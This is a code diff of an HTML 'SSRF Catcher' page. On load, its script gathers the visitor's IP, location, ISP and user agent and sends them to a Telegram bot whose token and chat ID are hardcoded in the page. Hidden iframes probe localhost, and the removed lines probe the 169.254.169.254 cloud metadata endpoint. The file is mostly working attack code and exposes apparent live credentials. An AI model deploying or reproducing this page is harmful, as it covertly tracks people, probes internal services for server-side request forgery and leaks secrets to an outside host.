@@ -1,42 +1,39 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
   <meta charset="UTF-8">
   <title>SSRF Catcher</title>
   <script>
-    const TELEGRAM_TOKEN = "8182692132:AAGPJzf4tOZ7be5vrvd3RD3RJFZoEbmq1zg";
-    const TELEGRAM_CHAT_ID = "6239813037";
-
     async function getIPInfo() {
       try {
         const res = await fetch("https://ipinfo.io/json?token=be5998b85f541c");
         return await res.json();
-      } catch {
+      } catch (e) {
         return {};
       }
     }
 
     async function sendToTelegram(message) {
-      try {
-        const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
-        await fetch(url, {
-          method: "POST",
-          headers: {"Content-Type": "application/json"},
-          body: JSON.stringify({chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: "Markdown"})
-        });
-      } catch {}
+      const token = "8182692132:AAGPJzf4tOZ7be5vrvd3RD3RJFZoEbmq1zg";
+      const chat_id = "6239813037";
+      const url = `https://api.telegram.org/bot${token}/sendMessage`;
+      await fetch(url, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id, text: message, parse_mode: "Markdown" })
+      });
     }
 
     function formatMessage(data) {
-      return `📄 *[SSRF CATCHER]*\n
-🌟 *SSRF Attempt Triggered!*
+      return `📄 *[SSRF CATCHER]*
+🌟 *SSRF Confirmed!* Server followed localhost redirect.
 🌐 *IP:* ${data.ip || "Unknown"}
 📍 *City:* ${data.city || "Unknown"}
 🌎 *Country:* ${data.country || "Unknown"}
 🏢 *ISP:* ${data.org || "Unknown"}
-🧠 *User-Agent:* \`${navigator.userAgent}\`
-🔗 *Referrer:* ${document.referrer || "Direct"}
-🕒 *Timestamp:* ${new Date().toLocaleString()}`;
+🧠 *User-Agent:* ${navigator.userAgent}
+🕒 *Timestamp:* ${new Date().toISOString()}`;
     }
 
     async function run() {
@@ -48,11 +45,11 @@
     window.onload = run;
   </script>
 </head>
+
 <body>
   <h1>SSRF Check Complete.</h1>
-  <!-- محاولات SSRF متعددة -->
+  <!-- محاولة SSRF -->
   <iframe src="http://127.0.0.1:80" style="display:none;"></iframe>
-  <iframe src="http://localhost:8000" style="display:none;"></iframe>
-  <iframe src="http://169.254.169.254/latest/meta-data/" style="display:none;"></iframe>
 </body>
+
 </html>
